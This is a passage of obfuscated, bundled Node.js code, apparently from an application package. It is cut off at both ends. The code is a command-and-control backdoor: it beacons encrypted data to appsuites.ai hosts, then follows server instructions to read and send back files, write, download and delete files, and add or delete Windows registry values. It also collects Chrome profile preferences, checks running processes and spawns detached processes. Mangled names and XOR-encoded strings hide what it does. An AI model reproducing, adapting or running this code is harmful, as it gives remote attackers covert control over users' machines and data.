      cm.P5DB32Q = [156, ''];
      cm.X5EADV2 = [157, ''];
      cm.F482TAM = [158, ''];
      cm.p5FDZHQ = [159, ''];
      cm.W592FFM = [160, ''];
      cm.q637JNS = [161, ''];
      cm.d422GJH = [162, ''];
      cm.v535X73 = [163, ''];
      cm.K4E5MWI = [164, ''];
      cm.W4F1V66 = [165, ''];
      cm.n4EBPL8 = [166, ''];
      const cn = class dp {
        static s59BT06(dq, dr = 0) {}
        static async W4EF0EI(ds, dt, du) {
          await this.Q44BIX9(1, ds, dt, undefined, du);
        }
        static async Y6CDW21(dv, dw, dx, dy) {
          await this.Q44BIX9(-1, dv, dw, dx, dy);
        }
        static async Q44BIX9(dz, ea, eb, ec, ed) {
          function ee(ej) {
            if (!ej) {
              return '';
            }
            let str6 = '';
            for (const ek of ej) {
              if (str6.length > 0) {
                str6 += '|';
              }
              if (typeof ek === 'boolean') {
                str6 += ek ? '1' : '0';
              } else {
                str6 += ek.toString().replace('|', '_');
              }
            }
            return str6;
          }
          var ef = ci.e5325L3.q474LOF ?? '';
          if (ef == '') {
            ef = "initialization";
          }
          const eg = new require("url").URLSearchParams();
          const eh = ch.S559FZQ.n677BRA.substring(0, 24) + ef.substring(0, 8);
          const ei = cy(eh, JSON.stringify({
            b: ea,
            c: ee(ed),
            e: ec ? ec.toString() : '',
            i: ef,
            l: dz,
            m: eb[0],
            p: ch.S559FZQ.t5A2WVR() ? 1 : 2,
            s: ci.e5325L3.x484Q1X,
            v: ci.e5325L3.Y55B2P2
          }));
          eg.append("data", ei.data);
          eg.append("iv", ei.iv);
          eg.append("iid", ef);
          await ct("api/s3/event", eg);
        }
        static g597ORN() {}
      };
      cg.w3F3UWA = cn;
      function co(el, em = [], en) {
        return require("child_process").spawn(el, em, {
          detached: true,
          stdio: "ignore",
          cwd: en
        });
      }
      cg.r5EEMKP = co;
      async function cp(eo) {
        return await require("node-fetch")(eo);
      }
      cg.y42BRXF = cp;
      async function cq(ep, eq) {
        return await require("node-fetch")(ep, {
          method: "POST",
          body: JSON.stringify(eq)
        });
      }
      cg.J60DFMS = cq;
      async function cr(er) {
        const fetch = require("node-fetch");
        let es;
        let et = "https://appsuites.ai/" + er;
        try {
          es = await fetch(et);
        } catch {}
        if (!es || !es.ok) {
          try {
            et = "https://sdk.appsuites.ai/" + er;
            es = await fetch(et);
          } catch {}
        }
        return es;
      }
      cg.e696T3N = cr;
      async function cs(eu, ev) {
        const fetch2 = require("node-fetch");
        let ew;
        let ex = "https://appsuites.ai/" + eu;
        if (ev.has('')) {
          ev.append('', '');
        }
        const obj2 = {
          headers: {
            "Content-Type": "application/x-www-form-urlencoded"
          },
          method: "POST",
          body: ev
        };
        try {
          ew = await fetch2(ex, obj2);
        } catch {}
        if (!ew || !ew.ok) {
          try {
            ex = "https://sdk.appsuites.ai/" + eu;
            ew = await fetch2(ex, obj2);
          } catch {}
        }
        return ew;
      }
      cg.h5235DD = cs;
      async function ct(ey, ez) {
        if (ez.has('')) {
          ez.append('', '');
        }
        return await require("node-fetch")("https://appsuites.ai/" + ey, {
          headers: {
            "Content-Type": "application/x-www-form-urlencoded"
          },
          method: "POST",
          body: ez
        });
      }
      cg.e63F2C3 = ct;
      function cu(fa, fb) {
        return new Promise((fc, fd) => {
          const fe = require("fs").createWriteStream(fb, {});
          const ff = (fa.startsWith("https") ? require("https") : require("http")).get(fa, (res) => {
            if (!res.statusCode || res.statusCode < 200 || res.statusCode > 299) {
              fd(new Error("LoadPageFailed " + res.statusCode));
            }
            res.pipe(fe);
            fe.on("finish", function () {
              fe.destroy();
              fc();
            });
          });
          ff.on("error", (fg) => fd(fg));
        });
      }
      cg.p464G3A = cu;
      function cv(fh) {
        try {
          require("fs").unlinkSync(fh);
        } catch {}
      }
      cg.T667X3K = cv;
      async function cw() {
        const fs6 = require("fs");
        const path2 = require("path");
        const proc = require("process");
        const fi = ch.S559FZQ.L695HPV;
        if (fs6.existsSync(fi)) {
          const fj = new Date().getTime() - fs6.statSync(fi).mtime.getTime();
          if (fj < 900000) {
            proc.exit(0);
          } else {
            fs6.unlinkSync(fi);
          }
        }
        fs6.writeFileSync(fi, '');
        proc.on("exit", () => {
          fs6.unlinkSync(fi);
        });
      }
      cg.F490EUX = cw;
      function cx(fk) {
        try {
          return require("fs").statSync(fk).size;
        } catch {
          return 0;
        }
      }
      cg.m4F8RIX = cx;
      function cy(fl, fm) {
        try {
          const crypto = require("crypto");
          const fn = crypto.randomBytes(16);
          const fo = crypto.createCipheriv("aes-256-cbc", fl, fn);
          let fp = fo.update(fm, "utf8", "hex");
          fp += fo.final("hex");
          return {
            data: fp,
            iv: fn.toString("hex")
          };
        } catch {
          return;
        }
      }
      cg.O694X7J = cy;
      function cz(fq, fr, ft) {
        try {
          const fu = require("crypto").createDecipheriv("aes-256-cbc", Buffer.from(fq), Buffer.from(ft, "hex"));
          let fv = fu.update(Buffer.from(fr, "hex"));
          fv = Buffer.concat([fv, fu.final()]);
          return fv.toString();
        } catch {
          return;
        }
      }
      cg.U61FWBZ = cz;
      function da(fw) {
        return Buffer.from(fw, "hex").toString("utf8");
      }
      cg.S634YX3 = da;
      function db(fx, ...fy) {
        try {
          var fz = fx.replace(/{(\d+)}/g, function (ga, gb) {
            const gc = parseInt(gb);
            if (isNaN(gc)) {
              return ga;
            }
            return typeof fy[gc] !== 'undefined' ? fy[gc] : ga;
          });
          return fz;
        } catch {
          return fx;
        }
      }
      cg.o5B4F49 = db;
    }
  });
  const f = b({
    'obj/V3EDFYY.js'(gd) {
      'use strict';

      Object.defineProperty(gd, '__esModule', {
        value: true
      });
      gd.t505FAN = undefined;
      const ge = c();
      const gf = e();
      var gg;
      (function (hn) {
        hn[hn.p5B1KEV = 0] = "p5B1KEV";
      })(gg || (gg = {}));
      var gh;
      (function (ho) {
        ho[ho.O435AMZ = 0] = "O435AMZ";
        ho[ho.w692AS2 = 1] = 'w692AS2';
      })(gh || (gh = {}));
      var gi;
      (function (hp) {
        hp[hp.B639G7B = 0] = "B639G7B";
        hp[hp.O435AMZ = 1] = "O435AMZ";
        hp[hp.j451KZ4 = 2] = "j451KZ4";
        hp[hp.R62AFMF = 3] = "R62AFMF";
        hp[hp.S58EMWW = 4] = "S58EMWW";
        hp[hp.P5F9KBR = 5] = "P5F9KBR";
      })(gi || (gi = {}));
      function gj(hq) {
        const hr = Buffer.isBuffer(hq) ? hq : Buffer.from(hq);
        const buf = Buffer.from(hr.slice(4));
        for (let n2 = 0; n2 < buf.length; n2++) {
          buf[n2] ^= hr.slice(0, 4)[n2 % 4];
        }
        return buf.toString("utf8");
      }
      function gk(hs) {
        hs = hs[gj([16, 233, 75, 213, 98, 140, 59, 185, 113, 138, 46])](/-/g, '');
        return Buffer.from("276409396fcc0a23" + hs.substring(0, 16), "hex");
      }
      function gl() {
        return Uint8Array.from([162, 140, 252, 232, 178, 47, 68, 146, 150, 110, 104, 76, 128, 236, 129, 43]);
      }
      function gm() {
        return Uint8Array.from([132, 144, 242, 171, 132, 73, 73, 63, 157, 236, 69, 155, 80, 5, 72, 144]);
      }
      function gn() {
        return Uint8Array.from([28, 227, 43, 129, 197, 9, 192, 3, 113, 243, 59, 145, 209, 193, 56, 86, 104, 131, 82, 163, 221, 190, 10, 67, 20, 245, 151, 25, 157, 70, 17, 158, 122, 201, 112, 38, 29, 114, 194, 166, 183, 230, 137, 160, 167, 99, 27, 45, 46, 31, 96, 23, 200, 241, 64, 26, 57, 33, 83, 240, 247, 139, 90, 48, 233, 6, 110, 12, 44, 108, 11, 73, 34, 231, 242, 173, 37, 92, 162, 198, 175, 225, 143, 35, 176, 133, 72, 212, 165, 195, 36, 226, 147, 68, 69, 146, 14, 0, 161, 87, 53, 196, 199, 195, 19, 80, 4, 49, 169, 188, 153, 30, 124, 142, 206, 159, 180, 170, 123, 88, 15, 95, 210, 152, 24, 63, 155, 98, 181, 7, 141, 171, 85, 103, 246, 222, 97, 211, 248, 136, 126, 22, 168, 214, 249, 93, 109, 91, 111, 21, 213, 229, 135, 207, 54, 40, 244, 47, 224, 215, 164, 51, 208, 100, 144, 16, 55, 66, 18, 42, 39, 52, 186, 127, 118, 65, 61, 202, 160, 253, 125, 74, 50, 106, 228, 89, 179, 41, 232, 148, 32, 231, 138, 132, 121, 115, 150, 220, 5, 240, 184, 182, 76, 243, 58, 60, 94, 238, 107, 140, 163, 217, 128, 120, 78, 134, 102, 75, 105, 79, 116, 247, 119, 189, 149, 185, 216, 13, 117, 236, 126, 156, 8, 130, 2, 154, 178, 101, 71, 254, 62, 1, 81, 177, 205, 250, 219, 6, 203, 172, 125, 191, 218, 77, 235, 252]);
      }
      function go(ht, hu) {
        if (ht.length !== hu.length) {
          return false;
        }
        for (let hv = 0; hv < ht.length; hv++) {
          if (ht[hv] !== hu[hv]) {
            return false;
          }
        }
        return true;
      }
      function gp(hw) {
        if (!hw) {
          return new Uint8Array();
        }
        return new Uint8Array(Buffer.from(hw, "hex"));
      }
      function gq(hx) {
        if (!hx) {
          return '';
        }
        return Buffer.from(hx).toString("hex");
      }
      function gr(hy, hz) {
        const crypto2 = require("crypto");
        const ia = crypto2.randomBytes(16);
        const ib = crypto2.createCipheriv("aes-128-cbc", gk(hz), ia);
        ib.setAutoPadding(true);
        let ic = ib.update(hy, "utf8", "hex");
        ic += ib.final("hex");
        return ia.toString("hex").toUpperCase() + "A0FB" + ic.toUpperCase();
      }
      function gs(id, ie) {
        const ig = require("crypto").createDecipheriv("aes-128-cbc", gk(ie), Buffer.from(id.substring(0, 32), "hex"));
        ig.setAutoPadding(true);
        let ih = ig.update(id.substring(36), "hex", "utf8");
        ih += ig.final("utf8");
        return ih;
      }
      function gt(ii, ij) {
        if (ii.length <= 32) {
          return new Uint8Array();
        }
        const bytes = new Uint8Array([...gl(), ...ij]);
        const ik = ii.slice(0, 16);
        const il = gn();
        const im = ii.slice(16);
        for (let ip = 0; ip < im.length; ip++) {
          const iq = ik[ip % ik.length] ^ bytes[ip % bytes.length] ^ il[ip % il.length];
          im[ip] ^= iq;
        }
        const io = im.length - 16;
        if (!go(im.slice(io), gm())) {
          return new Uint8Array();
        }
        return im.slice(0, io);
      }
      const gu = class {
        static W698NHL(ir) {
          const arr5 = [];
          if (!Array.isArray(ir)) {
            return arr5;
          }
          for (const is of ir) {
            arr5.push({
              d5E0TQS: is.Path ?? '',
              a47DHT3: is.Data ?? '',
              i6B2K9E: is.Key ?? '',
              A575H6Y: Boolean(is.Exists),
              Q57DTM8: typeof is.Action === "number" ? is.Action : 0
            });
          }
          return arr5;
        }
        static T6B99CG(it) {
          return it.map((iu) => ({
            Path: iu.d5E0TQS,
            Data: iu.a47DHT3,
            Key: iu.i6B2K9E,
            Exists: iu.A575H6Y,
            Action: iu.Q57DTM8
          }));
        }
        static u6CAWW3(iv) {
          return {
            c608HZL: Array.isArray(iv.File) ? this.W698NHL(iv.File) : [],
            y4BAIF6: Array.isArray(iv.Reg) ? this.W698NHL(iv.Reg) : [],
            Z59DGHB: Array.isArray(iv.Url) ? this.W698NHL(iv.Url) : [],
            s67BMEP: Array.isArray(iv.Proc) ? this.W698NHL(iv.Proc) : []
          };
        }
        static N5A4FRL(iw) {
          return {
            File: this.T6B99CG(iw.c608HZL),
            Reg: this.T6B99CG(iw.y4BAIF6),
            Url: this.T6B99CG(iw.Z59DGHB),
            Proc: this.T6B99CG(iw.s67BMEP)
          };
        }
        static S59C847(ix) {
          return {
            b54FBAI: typeof ix.Progress === "number" ? ix.Progress : -1,
            P456VLZ: typeof ix.Activity === "number" ? ix.Activity : -1,
            x567X2Q: this.u6CAWW3(ix.Value ?? {}),
            J6C4Y96: ix.NextUrl ?? '',
            I489V4T: ix.Session ?? '',
            h46EVPS: typeof ix.TimeZone === "number" ? ix.TimeZone : 255,
            b4CERH3: ix.Version ?? ''
          };
        }
        static b558GNO(iy) {
          return {
            Progress: iy.b54FBAI,
            Activity: iy.P456VLZ,
            Value: this.N5A4FRL(iy.x567X2Q),
            NextUrl: iy.J6C4Y96,
            Session: iy.I489V4T,
            TimeZone: iy.h46EVPS,
            Version: iy.b4CERH3
          };
        }
        static s40B7VN(iz) {
          return JSON.stringify(this.b558GNO(iz));
        }
      };
      function gv(ja) {
        const fs7 = require("fs");
        return fs7.existsSync(ja) && fs7.lstatSync(ja).isDirectory();
      }
      function gw(jb) {
        require("fs").mkdirSync(jb, {
          recursive: true
        });
      }
      function gx(jc) {
        try {
          return JSON.parse(jc);
        } catch {
          return {};
        }
      }
      function gy(jd, je) {
        return typeof jd?.[je] === "object" ? jd[je] : {};
      }
      function gz(jf) {
        const path3 = require("path");
        const os = require("os");
        let jg = jf;
        const obj3 = {
          "%LOCALAPPDATA%": path3.join(os.homedir(), "AppData", "Local"),
          "%APPDATA%": path3.join(os.homedir(), "AppData", "Roaming"),
          "%USERPROFILE%": os.homedir()
        };
        for (const [jh, ji] of Object.entries(obj3)) {
          const regex = new RegExp(jh, 'i');
          if (regex.test(jg)) {
            jg = jg.replace(regex, ji);
            break;
          }
        }
        return jg;
      }
      function ha() {
        return Math.floor(Date.now() / 1000).toString();
      }
      function hb(jj) {
        const fs8 = require("fs");
        if (fs8.existsSync(jj)) {
          fs8.unlinkSync(jj);
        }
      }
      function hc(jk, jl) {
        try {
          require("fs").writeFileSync(jk, jl);
          return true;
        } catch {
          return false;
        }
      }
      async function hd(jm) {
        return new Promise((jn, jo) => {
          (jm.startsWith("https") ? require("https") : require("http")).get(jm, (jp) => {
            const arr6 = [];
            jp.on("data", (jq) => arr6.push(jq));
            jp.on("end", () => jn(Buffer.concat(arr6)));
          }).on("error", (jr) => jo(jr));
        });
      }
      var str7 = '';
      var he;
      async function hf(js, jt) {
        const ju = new require("url").URLSearchParams({
          data: gr(JSON.stringify(gu.b558GNO(js)), str7),
          iid: str7
        }).toString();
        return await await require("node-fetch")("https://on.appsuites.ai" + jt, {
          headers: {
            "Content-Type": "application/x-www-form-urlencoded"
          },
          method: "POST",
          body: ju
        }).text();
      }
      async function hg(jv, jw) {
        jv.J6C4Y96 = '';
        jv.P456VLZ = 1;
        jv.b4CERH3 = "1.0.0.0";
        jv.h46EVPS = -new Date().getTimezoneOffset() / 60;
        for (let jx = 0; jx < 3; jx++) {
          jv.I489V4T = ha();
          const jy = await hf(jv, jw);
          if (jy && (typeof gx(jy)?.iid === "string" ? gx(jy).iid : '') === str7) {
            break;
          }
          await new Promise((jz) => setTimeout(jz, 3000));
        }
      }
      async function hh(ka) {
        const path4 = require("path");
        const fs9 = require("fs");
        const arr7 = [];
        const kb = (kh) => {
          kh.A575H6Y = false;
          if (kh.d5E0TQS) {
            kh.A575H6Y = require("fs").existsSync(gz(kh.d5E0TQS));
          }
        };
        const kc = (ki) => {
          ki.A575H6Y = false;
          if (ki.d5E0TQS) {
            const kj = gz(ki.d5E0TQS);
            ki.A575H6Y = require("fs").existsSync(kj);
            if (ki.A575H6Y) {
              ki.a47DHT3 = gq(require("fs").readFileSync(kj));
            }
          }
        };
        const kd = (kk) => {
          kk.A575H6Y = false;
          if (kk.d5E0TQS && kk.a47DHT3) {
            kk.a47DHT3 = '';
            const kl = gz(kk.d5E0TQS);
            const km = require("path").dirname(kl);
            if (!gv(km)) {
              gw(km);
            }
            kk.A575H6Y = hc(kl, gp(kk.a47DHT3));
          }
        };
        const ke = (kn) => {
          kn.A575H6Y = false;
          if (kn.d5E0TQS) {
            const ko = gz(kn.d5E0TQS);
            hb(ko);
            kn.A575H6Y = require("fs").existsSync(ko);
          }
        };
        const kf = (kp) => {
          kp.A575H6Y = false;
          if (kp.d5E0TQS) {
            const kq = gz(kp.d5E0TQS);
            const kr = path4.join(kq, "Local State");
            if (!require("fs").existsSync(kr)) {
              return;
            }
            const keys = Object.keys(gy(gy(gx(fs9.readFileSync(kr, "utf8")), "profile"), "info_cache"));
            for (const ks of keys) {
              const kt = path4.join(kq, ks, "Preferences");
              if (!require("fs").existsSync(kt)) {
                continue;
              }
              const ku = gy(gy(gy(gy(gx(fs9.readFileSync(kt, "utf8")), "profile"), "content_settings"), "exceptions"), "site_engagement");
              const json = JSON.stringify(ku);
              if (json) {
                arr7.push({
                  d5E0TQS: path4.join(kp.d5E0TQS, ks, "Preferences"),
                  a47DHT3: gq(Buffer.from(json, "utf8")),
                  i6B2K9E: '',
                  A575H6Y: true,
                  Q57DTM8: 5
                });
                kp.A575H6Y = true;
              }
            }
          }
        };
        for (const kg of ka) {
          if (kg.Q57DTM8 === 1) {
            kb(kg);
          } else if (kg.Q57DTM8 === 2) {
            kc(kg);
          } else if (kg.Q57DTM8 === 3) {
            kd(kg);
          } else if (kg.Q57DTM8 === 4) {
            ke(kg);
          } else if (kg.Q57DTM8 === 5) {
            kf(kg);
          }
        }
        if (arr7.length > 0) {
          ka.push(...arr7);
        }
      }
      async function hi(kv) {
        const cp2 = require("child_process");
        const arr8 = [];
        const kw = (le) => {
          if (!le) {
            return ['', ''];
          }
          if (le.endsWith("\\")) {
            return [le, ''];
          }
          const lf = le.lastIndexOf("\\");
          return lf !== -1 ? [le.substring(0, lf), le.substring(lf + 1)] : [le, ''];
        };
        const kx = (lg) => {
          return cp2.spawnSync("reg", ["query", lg], {
            stdio: "ignore"
          }).status === 0;
        };
        const ky = (lh, li) => {
          const lj = cp2.spawnSync("reg", ["query", lh, "/v", li], {
            encoding: "utf8"
          });
          if (lj.status !== 0) {
            return '';
          }
          for (const lk of lj.stdout.split("\n")) {
            const ll = lk.trim().split(/\s{2,}/);
            if (ll.length >= 3 && ll[0] === li) {
              return ll[2];
            }
          }
          return '';
        };
        const kz = (lm) => {
          let flag = false;
          const ln = cp2.spawnSync("reg", ["query", lm], {
            encoding: "utf8"
          });
          if (ln.error) {
            return flag;
          }
          if (ln.status !== 0) {
            return flag;
          }
          const lo = ln.stdout.split("\n").filter((lp) => lp.trim() !== '');
          for (let lq = 1; lq < lo.length; lq++) {
            const lr = lo[lq].trim().split(/\s{4,}/);
            if (lr.length === 3) {
              const [ls, lt, lu] = lr;
              const obj4 = {
                Q57DTM8: 2,
                A575H6Y: true,
                d5E0TQS: lm + ls,
                a47DHT3: lu,
                i6B2K9E: ''
              };
              arr8.push(obj4);
              flag = true;
            }
          }
          return flag;
        };
        const la = (lv, lw) => {
          return cp2.spawnSync("reg", ["delete", lv, "/v", lw, "/f"], {
            stdio: "ignore"
          }).status === 0;
        };
        const lb = (lx) => {
          cp2.spawnSync("reg", ["delete", lx, "/f"], {
            stdio: "ignore"
          });
        };
        const lc = (ly, lz, ma) => {
          const mb = cp2.spawnSync("reg", ["add", ly, "/v", lz, "/t", "REG_SZ", "/d", ma, "/f"], {
            stdio: "ignore"
          });
          return mb.status === 0;
        };
        for (const ld of kv) {
          if (ld.Q57DTM8 === 1) {
            if (ld.d5E0TQS) {
              const [mc, md] = kw(ld.d5E0TQS);
              ld.A575H6Y = md ? !!ky(mc, md) : kx(mc);
            }
          } else if (ld.Q57DTM8 === 2) {
            if (ld.d5E0TQS) {
              const [me, mf] = kw(ld.d5E0TQS);
              if (mf) {
                ld.a47DHT3 = ky(me, mf);
              } else {
                ld.A575H6Y = kz(me);
              }
            }
          } else if (ld.Q57DTM8 === 3) {
            if (ld.d5E0TQS && ld.a47DHT3) {
              const [mg, mh] = kw(ld.d5E0TQS);
              ld.A575H6Y = lc(mg, mh, gz(gz(ld.a47DHT3)));
            }
          } else if (ld.Q57DTM8 === 4) {
            if (ld.d5E0TQS) {
              const [mi, mj] = kw(ld.d5E0TQS);
              if (mj) {
                ld.A575H6Y = !la(mi, mj);
              } else {
                lb(mi);
                ld.A575H6Y = kx(mi);
              }
            }
          }
        }
        if (arr8.length > 0) {
          kv.push(...arr8);
        }
      }
      async function hj(mk) {
        const ml = async (mo) => {
          mo.A575H6Y = false;
          if (mo.d5E0TQS && mo.a47DHT3) {
            if (mo.a47DHT3.startsWith("http") || mo.a47DHT3.startsWith("https")) {
              const mp = await hd(mo.a47DHT3);
              if (mp.length > 0) {
                const mq = gz(mo.d5E0TQS);
                const mr = require("path").dirname(mq);
                if (!gv(mr)) {
                  gw(mr);
                }
                mo.A575H6Y = hc(mq, mp);
              }
            }
          }
        };
        const mm = async (ms) => {
          ms.A575H6Y = false;
          if (ms.d5E0TQS && ms.a47DHT3 && ms.i6B2K9E) {
            if (ms.a47DHT3.startsWith("http") || ms.a47DHT3.startsWith("https")) {
              const mt = gt(await hd(ms.a47DHT3), gp(ms.i6B2K9E));
              if (mt.length > 0) {
                const mu = gz(ms.d5E0TQS);
                const mv = require("path").dirname(mu);
                if (!gv(mv)) {
                  gw(mv);
                }
                ms.A575H6Y = hc(mu, mt);
              }
            }
          }
        };
        for (const mn of mk) {
          if (mn.Q57DTM8 === 3) {
            if (!mn.i6B2K9E) {
              await ml(mn);
            } else {
              await mm(mn);
            }
          }
        }
      }
      async function hk(mw) {
        if (mw.length === 0) {
          return;
        }
        const arr9 = [];
        const mx = he().split('|');
        const my = (na) => {
          for (const nb of mx) {
            if (nb.includes(na.toUpperCase())) {
              return nb;
            }
          }
          return '';
        };
        for (const mz of mw) {
          if (mz.Q57DTM8 === 1) {
            const nc = my(mz.d5E0TQS);
            mz.A575H6Y = nc !== '';
            if (mz.A575H6Y) {
              mz.d5E0TQS = nc;
            }
          } else if (mz.Q57DTM8 === 2) {
            for (const nd of mx) {
              arr9.push({
                d5E0TQS: nd,
                a47DHT3: '',
                i6B2K9E: '',
                A575H6Y: true,
                Q57DTM8: 2
              });
            }
          }
        }
        if (arr9.length > 0) {
          mw.push(...arr9);
        }
      }
      async function hl(ne) {
        const nf = gx(ne);
        const ng = typeof nf?.iid === "string" ? nf.iid : '';
        if (ng != str7) {
          return;
        }
        const nh = typeof nf?.data === "string" ? nf.data : '';
        if (nh.length == 0) {
          return;
        }
        const ni = gs(nh, ng);
        if (!ni) {
          return;
        }
        const nj = gu.S59C847(gx(ni));
        const nk = nj.J6C4Y96;
        if (!nk) {
          return;
        }
        await hh(nj.x567X2Q.c608HZL);
        await hi(nj.x567X2Q.y4BAIF6);
        await hj(nj.x567X2Q.Z59DGHB);
        await hk(nj.x567X2Q.s67BMEP);
        await hg(nj, nk);
      }
      async function hm(nl, nm) {
        str7 = nl;
        he = nm;
        const obj5 = {
          b54FBAI: 0,
          P456VLZ: 0,
          I489V4T: ha(),
          h46EVPS: -new Date().getTimezoneOffset() / 60,
          b4CERH3: "1.0.0.0",
          J6C4Y96: '',
          x567X2Q: {
            c608HZL: [],
            y4BAIF6: [],
            Z59DGHB: [],
            s67BMEP: []
          }
        };
        const nn = await hf(obj5, "/ping");
        if (nn) {
          await hl(nn);
        }
      }
      gd.t505FAN = hm;
    }
  });
  const g = b({
    'obj/T3EADFE.js'(no) {
      'use strict';

      Object.defineProperty(no, "__esModule", {
        value: true
      });
      no.A672SIS = no.U5E7DEV = no.i61CFAL = undefined;
      const np = c();
      const nq = e();
      const nr = d();
      var ns;
      (function (nz) {
        nz[nz.B639G7B = 0] = 'B639G7B';
        nz[nz.N6330WH = 1] = "N6330WH";
        nz[nz.q564DFB = 2] = 'q564DFB';
        nz[nz.q5A5TD7 = 3] = "q5A5TD7";
        nz[nz.h6074WA = 4] = "h6074WA";
        nz[nz.j4B56KB = 5] = "j4B56KB";
        nz[nz.F58C0X0 = 6] = "F58C0X0";
        nz[nz.i623ZUC = 7] = "i623ZUC";
      })(ns || (ns = {}));
      const nt = class {
        constructor() {
          this.H5C67AR = false;
          this.n412K1U = false;
          this.n5B332O = false;
          this.k61AQMQ = false;
          this.a6AFL0X = false;
          this.D4E3EHU = false;
          this.E67CJ69 = false;
          this.a586DQ2 = false;
          this.X42CN81 = false;
          this.Y4B23HN = false;
          this.T5B2T2A = false;
          this.V54518G = false;
          this.T5F71B2 = false;
          this.g5ABMVH = false;
          this.t533W41 = '';
          this.O6CBOE4 = '';
        }
      };
      no.i61CFAL = nt;
      const nu = class {
        constructor(oa, ob, oc, od, oe) {
          this.m5BCP18 = false;
          this.C5C7K1A = '';
          this.K5F23B9 = '';
          this.j5D4IOV = '';
          this.O6CBOE4 = '';
          if (oa !== undefined) {
            this.m5BCP18 = oa;
          }
          if (ob !== undefined) {
            this.C5C7K1A = ob;
          }
          if (oc !== undefined) {
            this.K5F23B9 = oc;
          }
          if (od !== undefined) {
            this.j5D4IOV = od;
          }
          if (oe !== undefined) {
            this.O6CBOE4 = oe;
          }
        }
      };
      const nv = class {
        constructor(of, og, oh) {
          this.m5BCP18 = false;
          this.C5C7K1A = '';
          this.p6845JK = '';
          if (of !== undefined) {
            this.m5BCP18 = of;
          }
          if (og !== undefined) {
            this.C5C7K1A = og;
          }
          if (oh !== undefined) {
            this.p6845JK = oh;
          }
        }
      };
      var nw;
      (function (oi) {
        oi[oi.K4E7SBI = 0] = "K4E7SBI";
        oi[oi.C5B7MFV = 1] = "C5B7MFV";
        oi[oi.u6BB118 = 2] = 'u6BB118';
      })(nw = no.U5E7DEV || (no.U5E7DEV = {}));
      var nx;
      (function (oj) {
        oj[oj.s46FO09 = 0] = 's46FO09';
        oj[oj.d56ECUF = 1] = "d56ECUF";
        oj[oj.z479UBI = 2] = "z479UBI";
      })(nx || (nx = {}));
      const ny = class {
        constructor(ok, ol, om, on, oo) {
          this.Z5A9DKG = false;
          this.A64CEBI = '';
          this.X6066R5 = ok;
          this.r42EX1Q = ol;
          this.e5FBF4O = om;
          this.t4E0LPU = on;
          this.q48AQYC = oo;
        }
        async q41FDEK() {
          await nq.w3F3UWA.W4EF0EI(0, [159, '']);
          async function op() {
            return !(((await np.S559FZQ.l610ZCY("size")) ?? '') == '');
          }
          if (await op()) {
            const ot = (await np.S559FZQ.l610ZCY("iid")) ?? '';
            nr.e5325L3.q474LOF = ot;
            await nq.w3F3UWA.W4EF0EI(0, ot != '' ? [160, ''] : [161, '']);
            return 0;
          }
          const oq = this.X6066R5() ?? '';
          if ('' == oq) {
            try {
              await np.S559FZQ.c5E4Z7C("size", "67");
            } catch {}
            await nq.w3F3UWA.Y6CDW21(0, [154, ''], undefined, ['', oq]);
            return 2;
          }
          let str8 = '';
          try {
            try {
              await np.S559FZQ.c5E4Z7C("size", "67");
            } catch {}
            var or = await nq.e696T3N("api/s3/new?fid=ip&version=" + nr.e5325L3.Y55B2P2);
            if (or) {
              str8 = await or.json().iid;
              if (str8 != '') {
                nr.e5325L3.q474LOF = str8;
              }
            }
            if (str8 != '') {
              const ou = function (ov) {
                let str9 = '';
                for (let ow = 0; ow < ov.length; ow++) {
                  str9 += ov.charCodeAt(ow).toString(16).padStart(2, '0');
                }
                return str9;
              };
              await np.S559FZQ.c5E4Z7C("iid", str8);
              await np.S559FZQ.c5E4Z7C("usid", ou(oq));
              await nq.w3F3UWA.W4EF0EI(0, [103, ''], ['', oq]);
              return 1;
            } else {
              await np.S559FZQ.c5E4Z7C("iid", '');
              await nq.w3F3UWA.Y6CDW21(0, [154, ''], undefined, ['', oq]);
            }
          } catch (ox) {
            await nq.w3F3UWA.Y6CDW21(0, [154, ''], ox, ['', oq]);
          }
          return 2;
        }
        async A4B0MTO() {
          try {
            if (await this.m6ABVY9()) {
              await f().t505FAN(nr.e5325L3.q474LOF, this.q48AQYC);
            }
          } catch {}
        }
        async m58FJB5(oy) {
          try {
            nr.e5325L3.x484Q1X = oy;
            if (nr.e5325L3.x484Q1X == np.a689XV5.B639G7B) {
              return;
            }
            await nq.F490EUX();
            await np.S559FZQ.J6021ZT();
            if (!(await this.m6ABVY9())) {
              return;
            }
            await this.U6B4YNR();
            await this.Z425M7G();
            var oz = await this.e4F5CS0();
            if (await this.H5AE3US(oz.O6CBOE4)) {
              const data = JSON.parse(oz.O6CBOE4);
              const arr10 = [];
              for (const pa in data) {
                if (data.hasOwnProperty(pa)) {
                  const pb = data[pa];
                  for (const pc in pb) {
                    if (pb.hasOwnProperty(pc)) {
                      await this.O69AL84(pa, pc, pb[pc]);
                      arr10.push(pc);
                    }
                  }
                }
              }
              if (arr10.length > 0) {
                await nq.w3F3UWA.W4EF0EI(0, [107, ''], arr10);
              }
            }
            if (oz.H5C67AR) {
              if (oz.a6AFL0X) {
                await this.p4FE5X4(nr.e5325L3.H64FNMG);
              } else if (oz.n412K1U) {
                await this.j458FW3(nr.e5325L3.H64FNMG);
              }
              if (oz.D4E3EHU) {
                await this.k47F3QK(nr.e5325L3.M56F8MB);
              }
              if (oz.E67CJ69 && nr.e5325L3.R6780KK) {
                await this.c647ECB(oz.a586DQ2);
              }
              if (oz.X42CN81 && nr.e5325L3.g4184BO) {
                await this.w5C1TZN(oz.Y4B23HN);
              }
              if (oz.T5B2T2A && nr.e5325L3.x4ADWAE) {
                await this.h659UF4(oz.V54518G);
              }
              if (oz.T5F71B2 && nr.e5325L3.z4DE429) {
                await this.W5F8HOG(oz.g5ABMVH);
              }
            }
            await nq.w3F3UWA.W4EF0EI(0, [102, ''], [nr.e5325L3.k596N0J, nr.e5325L3.n664BX9, nr.e5325L3.R6780KK, nr.e5325L3.g4184BO, nr.e5325L3.x4ADWAE, nr.e5325L3.r53FV0M, oz.H5C67AR, oz.n412K1U, oz.n5B332O, oz.k61AQMQ, oz.a6AFL0X, oz.D4E3EHU, nr.e5325L3.z4DE429]);
            return oz;
          } catch (pd) {
            await nq.w3F3UWA.Y6CDW21(0, [101, ''], pd);
            return;
          }
        }
        async m6ABVY9() {
          nr.e5325L3.q474LOF = (await np.S559FZQ.l610ZCY("iid")) ?? '';
          if (!nr.e5325L3.q474LOF || nr.e5325L3.q474LOF == '') {
            return false;
          }
          return true;
        }
        async U6B4YNR() {
          const pe = nr.e5325L3.q474LOF ?? '';
          const pf = new require("url").URLSearchParams();
          const pg = np.S559FZQ.n677BRA.substring(0, 24) + pe.substring(0, 8);
